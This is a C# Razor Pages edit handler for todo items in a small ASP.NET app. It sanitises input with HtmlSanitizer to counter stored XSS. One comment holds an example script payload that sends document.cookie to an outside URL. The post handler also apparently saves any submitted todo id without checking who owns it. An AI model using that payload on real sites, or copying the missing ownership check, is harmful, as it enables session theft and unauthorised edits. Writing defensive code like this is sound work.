using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using Microsoft.EntityFrameworkCore;
using ToDotNet.Models;
using Ganss.Xss;
namespace ToDotNet.Pages.Todos
{
    public class EditModel : PageModel
    {
        private readonly ToDotNet.Data.ToDotNetContext _context;

        public EditModel(ToDotNet.Data.ToDotNetContext context)
        {
            _context = context;
        }

        [BindProperty]
        public Todo Todo { get; set; } = default!;

        public async Task<IActionResult> OnGetAsync(int? id)
        {
            if (id == null || _context.Todo == null)
            {
                return NotFound();
            }

            var todo =  await _context.Todo.FirstOrDefaultAsync(m => m.Id == id);
            if (todo == null)
            {
                return NotFound();
            }
            Todo = todo;
            ViewData["UserId"] = todo.UserId;
            return Page();
        }

        public async Task<IActionResult> OnPostAsync()
        {
            
            _context.Attach(Todo).State = EntityState.Modified;

            try
            {
                // Persistent XSS vulnerability!!!
                // Example: <script>new Image().src="https://www.google.com.br/search?q="+document.cookie</script>

                var sanitizer = new HtmlSanitizer();
                Todo.Title = sanitizer.Sanitize(Todo.Title);
                Todo.Description = sanitizer.Sanitize(Todo.Description);
                Todo.Category = sanitizer.Sanitize(Todo.Category);

                await _context.SaveChangesAsync();
            }
            catch (DbUpdateConcurrencyException)
            {
                if (!TodoExists(Todo.Id))
                {
                    return NotFound();
                }
                else
                {
                    throw;
                }
            }

            return RedirectToPage("./Index", new { uid = Todo.UserId });
        }

        private bool TodoExists(int id)
        {
          return (_context.Todo?.Any(e => e.Id == id)).GetValueOrDefault();
        }
    }
}
